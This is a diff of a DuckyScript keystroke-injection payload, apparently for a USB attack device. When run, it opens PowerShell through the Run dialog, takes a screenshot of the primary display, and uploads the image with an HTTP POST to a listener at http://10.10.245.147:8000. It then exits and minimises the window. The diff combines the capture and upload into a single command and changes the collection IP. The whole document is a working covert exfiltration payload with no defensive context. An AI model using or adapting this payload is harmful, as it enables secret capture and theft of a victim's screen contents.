@@ -1,12 +1,6 @@
 GUI r
-ENTER
-
 STRING powershell
-
 ENTER
-
-STRING Add-Type -AssemblyName System.Windows.Forms;Add-Type -AssemblyName System.Drawing; $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height; $graphics = [System.Drawing.Graphics]::FromImage($bmp); $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size); $bmp.Save('C:\Users\Public\screenshot.png', [System.Drawing.Imaging.ImageFormat]::Png);
-
+STRING Add-Type -AssemblyName System.Windows.Forms;Add-Type -AssemblyName System.Drawing; $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height;$graphics = [System.Drawing.Graphics]::FromImage($bmp); $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size); $bmp.Save('C:\Users\Public\screenshot.png', [System.Drawing.Imaging.ImageFormat]::Png); Invoke-WebRequest -Uri http://10.10.245.147:8000 -Method Post -InFile 'C:\Users\Public\screenshot.png';exit
 ENTER
-
-STRING Invoke-WebRequest -Uri http://10.10.245.140:8000 -Method Post  -InFile 'C:\Users\Public\screenshot.png'
+GUI DOWN
